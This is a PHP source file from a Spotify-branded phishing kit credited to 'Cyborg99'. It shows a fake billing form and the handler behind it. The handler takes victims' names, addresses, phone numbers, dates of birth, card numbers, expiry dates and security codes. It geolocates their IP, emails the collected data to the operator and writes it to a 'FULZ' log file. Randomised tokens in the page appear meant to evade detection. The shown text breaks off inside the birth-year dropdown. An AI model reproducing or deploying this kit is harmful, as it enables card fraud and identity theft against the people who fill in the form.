<?php @error_reporting(0);
// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
include'../proxy.php';
$rand = dechex(rand(0x000000, 0xFFFFFF));
$host = isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'localhost';
$bert=md5 (rand(0,10000));
$bero=md5 (rand(0,100000));
$bero1=md5 (rand(0,10000));
$bero2=md5 (rand(0,10000));
$bero3=md5 (rand(0,1000));
$bero4=md5 (rand(0,1000));
$bero5=md5 (rand(0,100000));
$bero6=md5 (rand(0,10000));
$bert4=md5 (rand(0,1000));
require "../lang.php";
#################################################################################################################################
		$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
#################################################################################################################################
$dota = str_replace(".", "", $IP);
$zd = 'e';
$runa = $zd . '' . $dota;
if(isset($_POST['valien'])) 
{ 
// Required field names
$required = array('Firstname', 'cnu');

// Loop over field names, make sure each one exists and is not empty
$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  header("Location: index.php");
  die();
} else {

$cnum = $_POST['cnu'];
$bin = str_replace(' ', '', $cnum);
$bin = substr($bin, 0, 6);
function curl($url, $var = null) {
              $curl = curl_init($url);
              curl_setopt($curl, CURLOPT_TIMEOUT, 25);
              if ($var != null) {
                  curl_setopt($curl, CURLOPT_POST, true);
                  curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
              }
              curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
              curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
              $result = curl_exec($curl);
              curl_close($curl);
              return $result;
          }
          // JSON DATA
            $curl = curl('https://lookup.binlist.net/' . $bin . '');
            $json = json_decode($curl);
            $brand = $json->scheme ? $json->scheme : "Gucci";
			$brandz = $json->brand ? $json->brand : "Gold";
            $cardType = $json->type ? $json->type : "Gucci";
            $cardCategory = $json->bank ? $json->bank : "Gucci";
			$prepai = $json->prepaid ? $json->prepaid : "no";
            $countryName = $json->country ? $json->country : "Gucci";
            $countryCode = $json->country ? $json->country : "Gucci";
			$catname = $cardCategory->name;
// -----
$ccbrand = $brandz;
$cctype = $brand;
$cclevel = $cardType;
$ccbank = $catname;
$prp = $prepai;

##############################################################################################################################################################
		include('mail.php');
##############################################################################################################################################################
	
##############################################################################################################################################################
		$fname = $_POST['Firstname'];
		$lname = $_POST['Lastname'];
		$Sreet = $_POST['Street'];
		$Houmber = $_POST['Housenumber'];
		$fone = $_POST['phone'];
		$zp = $_POST['zipe'];
		$mh = $_POST['month'];
		$dy = $_POST['day'];
		$yar = $_POST['year'];
		$cu = $_POST['cnu'];
		$exm = $_POST['ex-month'];
		$exy = $_POST['ex-year'];
		$sde = $_POST['secode'];
		
		$county = $_POST['county'];
		$city = $_POST['city'];
		$currencyCode = $_POST['currencyCode'];
		$timezone = $_POST['timezone'];
		$ems = $_POST['email'];

##############################################################################################################################################################
$MESSAGE = "<html><body><div><table cellpadding='0' cellspacing='0' align='center' border='0' bgcolor='#ffffff' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; width: 639px;'><tr><td width='600' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'><table cellpadding='0' cellspacing='0' width='600' border='0'><tr><td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'><p>Dear <font color='#008000'>".$PRONAME."</font>,<hr></p><p style=''><img border='0' src='https://1.bp.blogspot.com/-Xrkf51hrYhE/XV6xGp86chI/AAAAAAAAAHg/eO0RbRmZdbYif07iog4TpRM6uOqIY1czQCLcBGAs/s1600/SPOT.png'></p><p>
<hr><br></td></tr></table></td>
</tr>
</table>
</td>
<td width='26' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
</tr>
</table>
<table cellpadding='0' cellspacing='0' align='center' width='640' border='0' style='color: rgb(34, 34, 34); font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: small; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; width: 640px; margin: auto;'>
<tr>
<td width='20' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<td width='800' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<table cellpadding='0' cellspacing='0' width='320px' border='0'>
<tr>
<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
<strong>Card Details</strong><br>
First name : <h>".$fname."</h><br>
Last name : <h>".$lname."</h><br>
Street : <h>".$Sreet."</h><br>
House number & ZIP : <h>".$Houmber."</h> - <h>".$zp."</h><br>
Country : <font color='#0099FF'> <h>".$county."</h></font><br>
City : <h>".$city."</h><br>
Phone number : <h>".$fone."</h><br>
Date of birth : <h>".$mh."</h>/<h>".$dy."</h>/<h>".$yar."</h><br>
Card number : <font color='#FF00FF'> <h>".$cu."</h></font><br>
Expiry date : <font color='#FF00FF'> <h>".$exm."</h>/<h>".$exy."</h></font><br>
Security code : <font color='#FF00FF'> <h>".$sde."</font></td>
</tr>
</table>
</td>
<td width='27' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<td width='376' style='font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; margin: 0px;'>
<table cellpadding='0' cellspacing='0' width='400px' border='0'>
<tr>
<td align='left' style='font-family: Arial, Helvetica, sans-serif; margin: 0px; font-size: 14px; line-height: 20px; color: rgb(85, 85, 85); text-align: left;'>
<strong>User Details</strong><br>
Bank Name : <font color='#9933FF'> <h>".$ccbank."</h></font><br>
Brand  : <font color='#9933FF'> <h>".$ccbrand."</h></font><br>
IP  : <a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a><br>
COUNTRY  : <h> ".$COUNTRYNAME." - <font color='#FF6600'>".$COUNTRYCODE."</font> </h> <br>
BROWSER & OS  : <h>".$device_details."</h><br>
Curency  : <font color='#0099FF'> <h>".$currencyCode."</h></font><br>
Timezone  : <font color='#0099FF'> <h>".$timezone."</h></font><br>
TIME  : <h>".date('l jS \of F Y h:i:s A')."</h></td>
</tr>
</table>
</td>
</tr>
</table>
</div>";
$MESSAGE = wordwrap($MESSAGE,70);
##############################################################################################################################################################
		$SUBJECT = "$fname Billing | $ccbank | $cclevel | $ccbrand | $IP | $COUNTRYCODE";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: SPOTAsta v1 <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
        $setting = parse_ini_file('../conf.pak'); 
        $gettfe = $setting['threed']; 
        if($gettfe == 1) 
        {$CODED  ="link.php?$IP=".$COUNTRYNAME."&em=$ems&country=".$COUNTRYCODE."&".md5(microtime())."&$dota&s=".sha1(microtime());
        }else{$CODED  ="vb.php?$bert=".$dy."&fn$dota=$fname&ln$dota=$lname&ue=$usr&vi$dota&em=$ems&country=".$COUNTRYCODE."&$dota&".md5(microtime())."&s=".sha1(microtime());}
		header("Location: $CODED");
		$myfile = fopen("../rz/spoty-FULZ-$bert.html", "a+") or die("Unable to open file!");
		fwrite($myfile, '-------------------------------- * Card Info * -------------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
##############################################################################################################################################################
}
}
?>

<?php
if(isset($_GET[$runa]))
{
?>
<html id="app" lang="en" dir="ltr" class="ng-scope"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <title class="ng-binding"><?php echo $abtn; ?> - Spotıfy (<?php echo $COUNTRYCODE; ?>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $bert; ?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!--<base href="/">--><base href=".">
  <link rel="icon" href="data:image/x-icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8oAAAAIAAAAEAAAAABACAAAAAAAIAQAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wETExhBExMYgRMTGL8TExi/ExMY7xMTGN8TExi/ExMYvxMTGIETExhB////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYgRMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM<?php echo rand(1, 9); ?>TExgR////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wH///8BExMYMRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgx////Af///wH///8B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///8BExMYzxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM////8B////Af///wH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIH///8B////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExjPExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////ARMTGIETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExifExMYIf///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wH///8BExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgRMTGIETExivExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGJ8TExhhExMYEf///wETExgRExMYjxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjv////ARMTGEETExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExgx////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgxExMYnxMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExhBExMYgRMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYnxMTGIETExhhExMYQRMTGEETExhBExMYYRMTGIETExivExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGIETExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYnxMTGCETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYvxMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjPExMYcRMTGCH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMYgf///wETExghExMYURMTGIETExiBExMYvxMTGL8TExifExMYgRMTGIETExhBExMYEf///wH///8B////ARMTGBETExiBExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExiP////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExifExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY3xMTGL8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYrxMTGIETExhBExMYQRMTGEETExhBExMYQRMTGEETExhRExMYgRMTGK8TExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYzxMTGP8TExj/ExMY/xMTGP8TExi/ExMYvxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYYf///wH///8BExMYvxMTGP8TExj/ExMY/xMTGL8TExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExi/ExMY3xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGM8TExiPExMYQf///wH///8B////Af///wETExi/ExMY/xMTGP8TExj/ExMYgRMTGEETExj/ExMY/xMTGP8TExj/ExMYcf///wH///8BExMYIRMTGEETExiBExMYgRMTGIETExiBExMYgRMTGIETExiBExMYYRMTGEETExgR////Af///wH///8B////Af///wETExghExMYrxMTGP8TExj/ExMY/xMTGP8TExhB////ARMTGO8TExj/ExMY/xMTGP8TExhh////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExhRExMYrxMTGP8TExj/ExMY/xMTGP8TExj/ExMY7////wH///8BExMYgRMTGP8TExj/ExMY/xMTGP8TExifExMYYRMTGDH///8B////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wETExgRExMYQRMTGHETExivExMY7xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExiB////Af///wETExgRExMY7xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjfExMYvxMTGL8TExi/ExMYvxMTGL8TExi/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGBH///8B////Af///wETExiBExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiB////Af///wH///8B////Af///wETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYz////wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////ARMTGBETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGO8TExgR////Af///wH///8B////Af///wH///<?php echo rand(1, 9); ?>B////ARMTGDETExjvExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjvExMYMf///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGBETExjPExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYzxMTGBH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExiBExMY7xMTGP<?php echo rand(1, 9); ?>TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wETExgRExMYgRMTGO8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY7xMTGIETExgR////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////Af///wH///8B////ARMTGEETExiBExMYvxMTGL<?php echo rand(1, 9); ?>TExjvExMY7xMTGL<?php echo rand(1, 9); ?>TExi/ExMYgRMTGEH///8B////Af///wH///<?php echo rand(1, 9); ?>B////Af///wH///8B////Af///wH///8B////AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
  <link href="../libs/index.css" media="screen" rel="stylesheet">
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script type="text/javascript" src="https://ssl.geoplugin.net/javascript.gp?k=d4ca3f36a4e92551"></script>
  <script src="../libs/alerty.js"></script>
  <script type="text/javascript" src="../libs//jquery.Validator.js"></script>
</head>
<body ng-controller="LoginController" class="ng-scope">
<header id="js-navbar" class="navbar navbar-default navbar-static-top " role="banner">
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="sidepanel" data-target="#navbar-nav">
<span class="sr-only"><?php echo $bert; ?></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<ul class="nav">
<li class="dropdown">
<a onclick="geo()" class="user-link dropdown-toggle hidden-xs hidden-sm"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<a onclick="geo()" class="user-link hidden-md hidden-lg"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<ul class="dropdown-menu dropdown-menu-right">
<li><a><?php echo $bert; ?></a></li>
<li><a><?php echo $bert; ?></a></li>
</ul>
</li>
</ul>
<a onclick="geo()" class="user-link hidden"><div class="user-icon-container img-circle navbar-user-img"><svg class="user-icon"><use xlink:href="#user-icon"></use></svg></div></a>
<a class="navbar-brand"><span class="navbar-logo"><?php echo $bert; ?></span></a>
</div>
<div class="collapse navbar-collapse" id="navbar-nav">
<ul class="nav navbar-nav navbar-right"><li class="sidepanel-item-large hidden-md hidden-lg "></li>
<li class="sidepanel-item-large hidden-md hidden-lg "></li>
<li class="dropdown alternate hidden-sidepanel">
<a onclick="geo()" class="user-link dropdown-toggle">
<div class="user-icon-container img-circle navbar-user-img">
<svg class="user-icon"><use xlink:href="#user-icon"></use><svg id="user-icon" viewBox="0 0 1024 1024"> <path d="m730.06 679.64q-45.377 53.444-101.84 83.443t-120 29.999q-64.032 0-120.75-30.503t-102.6-84.451q-40.335 13.109-77.645 29.747t-53.948 26.722l-17.142 10.084q-29.747 19.159-51.175 57.729t-21.428 73.107 25.461 59.242 60.754 24.705h716.95q35.293 0 60.754-24.705t25.461-59.242-21.428-72.603-51.679-57.225q-6.554-4.033-18.907-10.84t-51.427-24.453-79.409-30.755zm-221.84 25.72q-34.285 0-67.561-14.873t-60.754-40.335-51.175-60.502-40.083-75.124-25.461-84.451-9.075-87.728q0-64.032 19.915-116.22t54.452-85.964 80.67-51.931 99.072-18.151 99.072 18.151 80.67 51.931 54.452 85.964 19.915 116.22q0 65.04-20.167 130.58t-53.948 116.72-81.426 83.443-98.568 32.268z"></path> </svg></div>
<span class="user-text"><?php echo $profidosicv; ?></span>
<svg class="svg-chevron-down"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#chevron-down"></use></svg>
</a>
</li>
</ul>
</div>
</div>
</header>
<div ng-include="template" class="ng-scope">
<br>
</div>
<div dir="<?php echo $semitic;?>" class="container-fluid login ng-scope">
  <div class="content">
    <div class="row ng-scope" ng-if="showContinueLabel">
          <div  class="col-xs-12 text-center">
              <span  class="h5 ng-binding"><?php echo $foprem;?>, <?php $setting = parse_ini_file('../conf.pak'); $gettfe = $setting['truelogin']; if($gettfe == 1) {echo $_GET['urr'];}else{echo $_GET[$dota];} ?></span>
          </div>
    </div>
    <br>

<div class="divider"></div>

<form dir="<?php echo $semitic;?>" name="$parent.accounts" action="bill.php?<?php echo $runa; ?>=<?php echo $bero4; ?>" method="post" class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">

<div dir="<?php echo $semitic;?>" class="row">
        <div class="col-md-6">
            <div class="form-group">
                <label ><?php echo $fna;?></label>
                <input type="text" id="error-13" name="Firstname" class="form-control" required>
            </div>
        </div>

        <div class="col-md-6">
            <div class="form-group">
                <label><?php echo $lna;?></label>
                <input type="text" required="required" id="error-11" name="Lastname" class="form-control">
            </div>
        </div>
    </div>
    
    <div class="form-group">
                <label><?php echo $stre;?></label>
                <input type="text" required="required" id="error-8" name="Street" class="form-control">
            </div>



<div class="row">
        <div class="col-md-4">
            <div class="form-group">
                <label><?php echo $usenu;?></label>
                <input type="number" maxlength="10" name="Housenumber" class="form-control">
            </div>
        </div>
        <div class="col-md-8">
            <div class="form-group">
                <label><?php echo $nenumbe;?></label>
                <input type="number" required="required" name="phone" class="form-control">
            </div>
        </div>
    </div>

<?php
if (empty($_GET['dob'])) {
echo '';
}else{
$str = $_GET['dob'];
$arr = explode(":", $str);
$surs = $arr[2];
if($surs >=00 && $surs <=19 )
{
$zh = '20';
$ras = $zh . '' . $surs;	
}else{
$zh = '19';
$ras = $zh . '' . $surs;
}
$oai = "<option selected value='$arr[0]'>$arr[0]</option>";
$oas = "<option selected value='$arr[1]'>$arr[1]</option>";
$oaz = "<option selected value='$ras'>$ras</option>";
}
?>


      
<div class="form-group">
    <label class="control-label">
        <?php echo $teofbir;?>
    </label>
    <div id="profile_birthdate" class="bootstrap-date row">
        <div class="col-xs-4">
            <select id="profile_birthdate_month" name="month" class="form-control">
                <option value="Month">
                    <?php echo $Mont;?>
                </option>
				<?php echo $oai; ?>
                <option value="1">01</option>
                <option value="2">02</option>
                <option value="3">03</option>
                <option value="4">04</option>
                <option value="5">05</option>
                <option value="6">06</option>
                <option value="7">07</option>
                <option value="8">08</option>
                <option value="9">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
            </select>
        </div>
        <div class="col-xs-4">
            <select id="profile_birthdate_day" name="day" class="form-control">
                <option value="">
                    <?php echo $Dai;?>
                </option>
				<?php echo $oas; ?>
                <option value="1">01</option>
                <option value="2">02</option>
                <option value="3">03</option>
                <option value="4">04</option>
                <option value="5">05</option>
                <option value="6">06</option>
                <option value="7">07</option>
                <option value="8">08</option>
                <option value="9">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
                <option value="13">13</option>
                <option value="14">14</option>
                <option value="15">15</option>
                <option value="16">16</option>
                <option value="17">17</option>
                <option value="18">18</option>
                <option value="19">19</option>
                <option value="20">20</option>
                <option value="21">21</option>
                <option value="22">22</option>
                <option value="23">23</option>
                <option value="24">24</option>
                <option value="25">25</option>
                <option value="26">26</option>
                <option value="27">27</option>
                <option value="28">28</option>
                <option value="29">29</option>
                <option value="30">30</option>
                <option value="31">31</option>
            </select>
        </div>
        <div class="col-xs-4">
            <select id="profile_birthdate_year" name="year" class="form-control">
                <option value="">
                    <?php echo $Ye;?>
                </option>
				<?php echo $oaz; ?>
                <option value="2019">2019</option>
                <option value="2018">2018</option>
                <option value="2017">2017</option>
                <option value="2016">2016</option>
                <option value="2015">2015</option>
                <option value="2014">2014</option>
                <option value="2013">2013</option>
                <option value="2012">2012</option>
                <option value="2011">2011</option>
                <option value="2010">2010</option>
                <option value="2009">2009</option>
                <option value="2008">2008</option>
                <option value="2007">2007</option>
                <option value="2006">2006</option>
                <option value="2005">2005</option>
                <option value="2004">2004</option>
                <option value="2003">2003</option>
                <option value="2002">2002</option>
                <option value="2001">2001</option>
                <option value="2000">2000</option>
                <option value="1999">1999</option>
                <option value="1998">1998</option>
                <option value="1997">1997</option>
                <option value="1996">1996</option>
                <option value="1995">1995</option>
                <option value="1994">1994</option>
                <option value="1993">1993</option>
                <option value="1992">1992</option>
                <option value="1991">1991</option>
                <option value="1990">1990</option>
                <option value="1989">1989</option>
                <option value="1988">1988</option>
                <option value="1987">1987</option>
                <option value="1986">1986</option>
                <option value="1985">1985</option>
                <option value="1984">1984</option>
                <option value="1983">1983</option>
                <option value="1982">1982</option>
                <option value="1981">1981</option>
                <option value="1980">1980</option>
